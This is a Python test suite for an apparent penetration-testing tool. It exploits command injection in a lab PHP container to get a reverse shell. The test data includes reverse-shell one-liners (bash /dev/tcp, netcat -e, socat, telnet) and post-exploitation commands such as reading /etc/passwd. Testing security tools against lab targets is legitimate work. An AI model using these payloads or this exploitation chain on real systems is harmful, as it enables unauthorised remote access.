#!/usr/bin/env python3
"""
Test Command Injection Exploitation

This test demonstrates the end-to-end command injection exploitation:
1. Spider website to find endpoints
2. Test for command injection vulnerabilities  
3. Exploit command injection to get reverse shell
4. Maintain connection and run commands
"""

import logging
import subprocess
import time
import unittest
from datetime import datetime

from dragonshard.core.test_utils import BaseTestCase, DockerContainerManager
from dragonshard.exploits.command_injection_exploiter import CommandInjectionExploiter

# Set up logging
logging.basicConfig(
    level=logging.DEBUG, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class TestCommandInjectionExploitation(BaseTestCase):
    """Test command injection exploitation end-to-end."""

    def setUp(self):
        """Set up test fixtures."""
        super().setUp()
        self.container_manager = DockerContainerManager()
        self.exploiter = CommandInjectionExploiter()
        
        # Test target URL (will be set when container is started)
        self.target_url = None
        self.container_name = None

    def tearDown(self):
        """Clean up test fixtures."""
        super().tearDown()
        
        # Close all reverse shell connections
        if hasattr(self.exploiter, 'reverse_shell_handler'):
            for connection_id in list(self.exploiter.reverse_shell_handler.connections.keys()):
                self.exploiter.reverse_shell_handler.close_connection(connection_id)

    def start_vulnerable_container(self) -> str:
        """Start a vulnerable container for testing."""
        logger.info("Starting vulnerable PHP container for command injection testing")
        
        try:
            # Start the vulnerable PHP container
            container_name = f"vuln-php-test-{int(time.time())}"
            result = subprocess.run(
                [
                    "docker", "run", "-d", "--name", container_name,
                    "-p", "8082:80",
                    "-e", "DB_HOST=mysql",
                    "-e", "DB_USER=testuser", 
                    "-e", "DB_PASS=testpass",
                    "-e", "DB_NAME=testdb",
                    "dragonshard-vuln-php:latest"
                ],
                capture_output=True,
                text=True,
                check=True
            )
            
            container_id = result.stdout.strip()
            self.container_name = container_name
            
            # Wait for container to be ready
            if not self.wait_for_container_ready(container_name, max_wait=30):
                raise subprocess.CalledProcessError(1, "docker run", "Container failed to start")
            
            # Get container IP
            ip_result = subprocess.run(
                [
                    "docker", "inspect", "-f", 
                    "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", 
                    container_name
                ],
                capture_output=True,
                text=True,
                check=True
            )
            
            container_ip = ip_result.stdout.strip()
            self.target_url = f"http://{container_ip}"
            
            logger.info(f"Vulnerable container started: {container_name} at {self.target_url}")
            return self.target_url
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to start vulnerable container: {e}")
            raise unittest.SkipTest("Docker or vulnerable container not available")

    def wait_for_container_ready(self, container_name: str, max_wait: int = 60) -> bool:
        """Wait for a container to be ready."""
        logger.info(f"Waiting for container {container_name} to be ready...")
        
        start_time = time.time()
        while time.time() - start_time < max_wait:
            try:
                # Check if container is running
                result = subprocess.run(
                    ["docker", "inspect", "-f", "{{.State.Status}}", container_name],
                    capture_output=True,
                    text=True,
                    check=True
                )
                
                status = result.stdout.strip()
                if status == "running":
                    # Try to connect to the web server
                    try:
                        curl_result = subprocess.run(
                            ["curl", "-f", "-s", "-o", "/dev/null", "-w", "%{http_code}", 
                             f"http://localhost:8082"],
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        
                        if curl_result.returncode == 0:
                            logger.info(f"Container {container_name} is ready!")
                            return True
                    except Exception:
                        pass
                        
            except subprocess.CalledProcessError:
                pass
                
            time.sleep(2)
        
        logger.error(f"Container {container_name} failed to start within {max_wait} seconds")
        return False

    def test_spider_website(self):
        """Test website spidering functionality."""
        logger.info("Testing website spidering")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Spider the website
        discovered_urls = self.exploiter.spider_website(target_url)
        
        # Verify that we discovered some URLs
        self.assertGreater(len(discovered_urls), 0, "Should discover at least the base URL")
        self.assertIn(target_url, discovered_urls, "Base URL should be discovered")
        
        logger.info(f"Discovered {len(discovered_urls)} URLs: {discovered_urls}")

    def test_command_injection_discovery(self):
        """Test command injection vulnerability discovery."""
        logger.info("Testing command injection discovery")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Discover command injection vulnerabilities
        vulnerabilities = self.exploiter.discover_command_injection_vulnerabilities(target_url)
        
        # Verify that we found vulnerabilities
        self.assertGreater(len(vulnerabilities), 0, "Should find command injection vulnerabilities")
        
        # Check vulnerability details
        for vuln in vulnerabilities:
            self.assertIsNotNone(vuln.url, "Vulnerability should have a URL")
            self.assertIsNotNone(vuln.parameter, "Vulnerability should have a parameter")
            self.assertIsNotNone(vuln.payload, "Vulnerability should have a payload")
            self.assertGreater(vuln.confidence, 0.6, "Vulnerability should have high confidence")
            self.assertIsNotNone(vuln.evidence, "Vulnerability should have evidence")
        
        logger.info(f"Found {len(vulnerabilities)} command injection vulnerabilities")

    def test_command_injection_exploitation(self):
        """Test command injection exploitation to get reverse shell."""
        logger.info("Testing command injection exploitation")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Discover vulnerabilities
        vulnerabilities = self.exploiter.discover_command_injection_vulnerabilities(target_url)
        self.assertGreater(len(vulnerabilities), 0, "Should find vulnerabilities to exploit")
        
        # Exploit the first vulnerability
        vulnerability = vulnerabilities[0]
        result = self.exploiter.exploit_command_injection(
            vulnerability, 
            attacker_ip="127.0.0.1", 
            attacker_port=4444
        )
        
        # Verify exploitation results
        self.assertIsNotNone(result.vulnerability, "Should have vulnerability details")
        self.assertIsNotNone(result.reverse_shell_connection_id, "Should have connection ID")
        self.assertIsNotNone(result.reverse_shell_port, "Should have port")
        
        # Check if we got a successful connection
        if result.connection_successful:
            logger.info("Reverse shell connection established successfully!")
            
            # Verify that we can execute commands
            self.assertGreater(len(result.commands_executed), 0, "Should have executed commands")
            self.assertGreater(len(result.output_captured), 0, "Should have captured output")
            
            # Check that we got meaningful output
            for output in result.output_captured:
                self.assertIsInstance(output, str, "Output should be string")
                self.assertGreater(len(output), 0, "Output should not be empty")
        else:
            logger.warning(f"Exploitation failed: {result.error_message}")
            # This might be expected in some test environments
        
        logger.info(f"Exploitation completed in {result.exploitation_time:.2f} seconds")

    def test_comprehensive_exploitation(self):
        """Test comprehensive end-to-end exploitation."""
        logger.info("Testing comprehensive exploitation")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Run comprehensive exploitation
        results = self.exploiter.run_comprehensive_exploitation(
            target_url, 
            attacker_ip="127.0.0.1", 
            attacker_port=4444
        )
        
        # Verify results
        self.assertIsInstance(results, dict, "Should return results dictionary")
        self.assertIn("success", results, "Should have success field")
        self.assertIn("vulnerabilities", results, "Should have vulnerabilities field")
        self.assertIn("exploitations", results, "Should have exploitations field")
        self.assertIn("total_vulnerabilities", results, "Should have total_vulnerabilities field")
        self.assertIn("successful_exploitations", results, "Should have successful_exploitations field")
        
        # Check that we found vulnerabilities
        self.assertGreater(results["total_vulnerabilities"], 0, "Should find vulnerabilities")
        
        # Check exploitation attempts
        self.assertGreater(len(results["exploitations"]), 0, "Should attempt exploitations")
        
        logger.info(f"Comprehensive exploitation results: {results}")

    def test_reverse_shell_command_execution(self):
        """Test executing commands on reverse shell."""
        logger.info("Testing reverse shell command execution")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Discover and exploit
        vulnerabilities = self.exploiter.discover_command_injection_vulnerabilities(target_url)
        self.assertGreater(len(vulnerabilities), 0, "Should find vulnerabilities")
        
        vulnerability = vulnerabilities[0]
        result = self.exploiter.exploit_command_injection(vulnerability)
        
        if result.connection_successful:
            # Test executing various commands
            test_commands = [
                "whoami",
                "id", 
                "pwd",
                "ls -la",
                "uname -a",
                "cat /etc/passwd | head -5"
            ]
            
            for cmd in test_commands:
                output = self.exploiter._execute_command_on_shell(
                    result.reverse_shell_connection_id, cmd
                )
                
                self.assertIsInstance(output, str, f"Command {cmd} should return string output")
                logger.info(f"Command '{cmd}' output: {output[:100]}...")
        
        logger.info("Reverse shell command execution test completed")

    def test_exploitation_summary(self):
        """Test exploitation summary functionality."""
        logger.info("Testing exploitation summary")
        
        # Start vulnerable container
        target_url = self.start_vulnerable_container()
        
        # Run some exploitation
        self.exploiter.discover_command_injection_vulnerabilities(target_url)
        
        # Get summary
        summary = self.exploiter.get_exploitation_summary()
        
        # Verify summary structure
        self.assertIn("total_vulnerabilities_discovered", summary)
        self.assertIn("total_exploitations_attempted", summary)
        self.assertIn("successful_exploitations", summary)
        self.assertIn("vulnerabilities", summary)
        self.assertIn("exploitations", summary)
        
        logger.info(f"Exploitation summary: {summary}")

    def test_payload_generation(self):
        """Test reverse shell payload generation."""
        logger.info("Testing payload generation")
        
        test_cases = [
            ("bash_reverse_shell", "192.168.1.100", 4444),
            ("sh_reverse_shell", "10.0.0.1", 8080),
            ("python_reverse_shell", "127.0.0.1", 9999),
            ("python3_reverse_shell", "127.0.0.1", 9998),
            ("php_reverse_shell", "172.16.0.1", 1234),
            ("perl_reverse_shell", "192.168.0.1", 5555),
            ("ruby_reverse_shell", "10.0.0.2", 6666),
            ("socat_reverse_shell", "192.168.1.2", 7777),
            ("telnet_reverse_shell", "172.16.0.2", 8888)
        ]
        
        for method, ip, port in test_cases:
            payload = self.exploiter._create_reverse_shell_payload(method, ip, port)
            
            self.assertIsInstance(payload, str, f"Payload for {method} should be string")
            self.assertGreater(len(payload), 0, f"Payload for {method} should not be empty")
            self.assertIn(ip, payload, f"Payload for {method} should contain IP")
            self.assertIn(str(port), payload, f"Payload for {method} should contain port")
            
            logger.info(f"Generated {method} payload: {payload[:50]}...")

    def test_response_analysis(self):
        """Test command injection response analysis."""
        logger.info("Testing response analysis")
        
        # Test cases with expected results
        test_cases = [
            # (response_text, payload, expected_vulnerable, expected_confidence_min)
            ("root 0 0", "whoami", True, 0.8),
            ("uid=0(root) gid=0(root)", "id", True, 0.8),
            ("total 8", "ls", True, 0.8),
            ("Linux ubuntu", "uname", True, 0.8),
            ("PING 127.0.0.1", "ping", True, 0.9),
            ("bash: command not found", "invalid", True, 0.7),
            ("Hello World", "echo", False, 0.0),
            ("404 Not Found", "test", False, 0.0),
        ]
        
        for response_text, payload, expected_vulnerable, expected_confidence_min in test_cases:
            is_vulnerable, evidence, confidence = self.exploiter._analyze_command_injection_response(
                response_text, 200, payload
            )
            
            self.assertEqual(is_vulnerable, expected_vulnerable, 
                          f"Vulnerability detection failed for payload '{payload}'")
            
            if expected_vulnerable:
                self.assertGreaterEqual(confidence, expected_confidence_min,
                                      f"Confidence too low for payload '{payload}'")
                self.assertIsNotNone(evidence, f"Should have evidence for payload '{payload}'")
            
            logger.info(f"Payload '{payload}': vulnerable={is_vulnerable}, confidence={confidence}")

    def test_determine_exploit_method(self):
        """Test exploit method determination."""
        logger.info("Testing exploit method determination")
        
        test_cases = [
            ("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", "bash_reverse_shell"),
            ("sh -i >& /dev/tcp/127.0.0.1/4444 0>&1", "sh_reverse_shell"),
            ("python3 -c 'import socket...'", "python3_reverse_shell"),
            ("python -c 'import socket...'", "python_reverse_shell"),
            ("php -r '$sock=fsockopen...'", "php_reverse_shell"),
            ("perl -e 'use Socket...'", "perl_reverse_shell"),
            ("ruby -rsocket -e '...'", "ruby_reverse_shell"),
            ("socat TCP:127.0.0.1:4444 EXEC:/bin/bash", "socat_reverse_shell"),
            ("telnet 127.0.0.1 4444 | /bin/bash", "telnet_reverse_shell"),
            ("nc 127.0.0.1 4444 -e /bin/bash", "netcat_reverse_shell"),
            ("ls", "bash_reverse_shell"),  # Default to bash
        ]
        
        for payload, expected_method in test_cases:
            method = self.exploiter._determine_exploit_method(payload)
            self.assertEqual(method, expected_method, 
                          f"Method determination failed for payload: {payload[:50]}...")
            
            logger.info(f"Payload: {payload[:30]}... -> Method: {method}")


def run_command_injection_exploitation_demo():
    """Run a demonstration of the command injection exploitation."""
    logger.info("ğŸš€ Starting Command Injection Exploitation Demo")
    
    # Create exploiter
    exploiter = CommandInjectionExploiter()
    
    # Target URL (vulnerable PHP app)
    target_url = "http://localhost:8082"
    
    logger.info(f"ğŸ¯ Target: {target_url}")
    
    # Step 1: Spider the website
    logger.info("ğŸ•·ï¸  Step 1: Spidering website...")
    discovered_urls = exploiter.spider_website(target_url)
    logger.info(f"ğŸ“„ Discovered {len(discovered_urls)} URLs")
    
    # Step 2: Discover command injection vulnerabilities
    logger.info("ğŸ” Step 2: Discovering command injection vulnerabilities...")
    vulnerabilities = exploiter.discover_command_injection_vulnerabilities(target_url)
    logger.info(f"ğŸ’¥ Found {len(vulnerabilities)} command injection vulnerabilities")
    
    for i, vuln in enumerate(vulnerabilities):
        logger.info(f"   Vulnerability {i+1}: {vuln.url} - {vuln.parameter}")
        logger.info(f"   Evidence: {vuln.evidence}")
        logger.info(f"   Confidence: {vuln.confidence:.2f}")
    
    # Step 3: Exploit vulnerabilities
    if vulnerabilities:
        logger.info("âš¡ Step 3: Exploiting vulnerabilities...")
        
        for i, vulnerability in enumerate(vulnerabilities[:2]):  # Limit to first 2
            logger.info(f"   Exploiting vulnerability {i+1}...")
            
            result = exploiter.exploit_command_injection(
                vulnerability, 
                attacker_ip="127.0.0.1", 
                attacker_port=4444 + i
            )
            
            if result.connection_successful:
                logger.info(f"   âœ… Reverse shell established! Connection ID: {result.reverse_shell_connection_id}")
                logger.info(f"   ğŸ“Š Commands executed: {len(result.commands_executed)}")
                logger.info(f"   ğŸ“ Sample output: {result.output_captured[0][:100]}...")
            else:
                logger.warning(f"   âŒ Exploitation failed: {result.error_message}")
    
    # Step 4: Get summary
    logger.info("ğŸ“Š Step 4: Getting exploitation summary...")
    summary = exploiter.get_exploitation_summary()
    logger.info(f"   Total vulnerabilities: {summary['total_vulnerabilities_discovered']}")
    logger.info(f"   Exploitation attempts: {summary['total_exploitations_attempted']}")
    logger.info(f"   Successful exploitations: {summary['successful_exploitations']}")
    
    logger.info("ğŸ‰ Command Injection Exploitation Demo Complete!")


if __name__ == "__main__":
    # Run the demo
    run_command_injection_exploitation_demo() 